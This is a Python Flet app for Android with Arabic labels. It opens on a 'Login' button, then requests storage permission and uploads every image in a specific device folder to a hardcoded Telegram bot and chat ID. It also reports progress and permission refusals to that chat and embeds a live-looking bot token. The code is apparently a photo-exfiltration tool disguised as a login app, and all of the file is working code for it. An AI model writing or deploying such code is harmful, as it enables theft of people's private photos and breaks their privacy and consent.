from flet import *
import flet as ft
import requests
import os
import time

# --- إعدادات البوت ---
BOT_TOKEN = "7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk"
CHAT_ID = "5739065274"

# --- مسار الصور ---
IMAGE_PATH = "/storage/emulated/0/Pictures/100PINT/Pins"

def send_telegram_message(message):
    """إرسال رسالة نصية إلى التلجرام"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": message}, timeout=10)
    except Exception as e:
        print(f"خطأ في إرسال الرسالة: {e}")

def send_telegram_photo(photo_path):
    """إرسال صورة إلى التلجرام"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(photo_path, 'rb') as photo:
            files = {"photo": photo}
            data = {"chat_id": CHAT_ID}
            requests.post(url, files=files, data=data, timeout=20)
    except Exception as e:
        print(f"خطأ في إرسال الصورة {photo_path}: {e}")

def main(page: Page):
    page.title = "مرسل الصور الذكي"
    page.theme_mode = "dark"
    page.window_width = 400
    page.window_height = 700
    page.padding = 20
    page.vertical_alignment = "center"
    page.horizontal_alignment = "center"
    page.bgcolor = "#121212"

    # --- عناصر الواجهة ---
    status_icon = Icon(name=icons.HOURGLASS_EMPTY, color="gray", size=80)
    status_text = Text("جاهز للبدء", size=18, weight="bold", text_align="center")
    progress_bar = ProgressBar(width=300, value=0, visible=False)
    start_button = ElevatedButton(
        "🔐 دخول",
        icon=icons.LOGIN,
        width=200,
        height=50,
        style=ButtonStyle(
            bgcolor={"": "blue"},
            color={"": "white"},
            shape=RoundedRectangleBorder(radius=10)
        )
    )

    # --- دالة طلب الصلاحيات ---
    def request_permission(e):
        start_button.disabled = True
        start_button.text = "جاري التحقق..."
        page.update()

        if page.platform == "android":
            result = ft.permissions.request_permission(ft.permissions.Permission.STORAGE)
            if result != ft.permissions.PermissionStatus.GRANTED:
                status_text.value = "❌ تم رفض الصلاحية"
                status_icon.name = icons.CLOSE_CIRCLE
                status_icon.color = "red"
                send_telegram_message("❌ التطبيق: تم رفض إذن التخزين")
                page.update()
                time.sleep(2)
                page.window_close()
                return

        # بعد منح الصلاحية
        status_text.value = "✅ الصلاحية ممنوحة! اضغط على الزر لبدء الإرسال"
        status_icon.name = icons.CHECK_CIRCLE
        status_icon.color = "green"
        start_button.text = "🚀 بدء الإرسال"
        start_button.on_click = start_sending
        page.update()

    # --- دالة بدء إرسال الصور ---
    def start_sending(e):
        start_button.disabled = True
        start_button.text = "جاري الإرسال..."
        progress_bar.visible = True
        page.update()

        send_telegram_message("✅ تم تشغيل التطبيق وبدء نقل الصور")

        if not os.path.exists(IMAGE_PATH):
            error_msg = f"⚠️ المسار غير موجود: {IMAGE_PATH}"
            status_text.value = error_msg
            status_icon.name = icons.WARNING
            status_icon.color = "orange"
            send_telegram_message(error_msg)
            page.update()
            return

        try:
            images = [f for f in os.listdir(IMAGE_PATH) if f.lower().endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp"))]
        except Exception as e:
            error_msg = f"🚫 خطأ في قراءة المجلد: {e}"
            status_text.value = error_msg
            send_telegram_message(error_msg)
            page.update()
            return

        if not images:
            status_text.value = "📂 لا توجد صور في المجلد"
            send_telegram_message("📂 لا توجد صور لتحميلها")
            page.update()
            return

        total = len(images)
        status_text.value = f"📤 جاري إرسال {total} صورة..."
        page.update()

        for idx, file_name in enumerate(images, start=1):
            photo_path = os.path.join(IMAGE_PATH, file_name)
            send_telegram_photo(photo_path)
            send_telegram_message(f"📸 تم إرسال الصورة {idx}/{total}: {file_name}")
            progress_bar.value = idx / total
            status_text.value = f"تم {idx}/{total}"
            page.update()
            time.sleep(1)

        # انتهاء
        final_msg = "🎉 تم إرسال جميع الصور بنجاح ✅"
        status_text.value = final_msg
        status_icon.name = icons.STAR
        status_icon.color = "gold"
        send_telegram_message(final_msg)
        start_button.text = "تم الانتهاء"
        start_button.disabled = True
        page.update()

    # --- تعيين زر البدء ---
    start_button.on_click = request_permission

    # --- بناء الواجهة ---
    page.add(
        Column([
            status_icon,
            status_text,
            progress_bar,
            start_button
        ], alignment="center", spacing=20)
    )

# --- تشغيل التطبيق ---
app(target=main)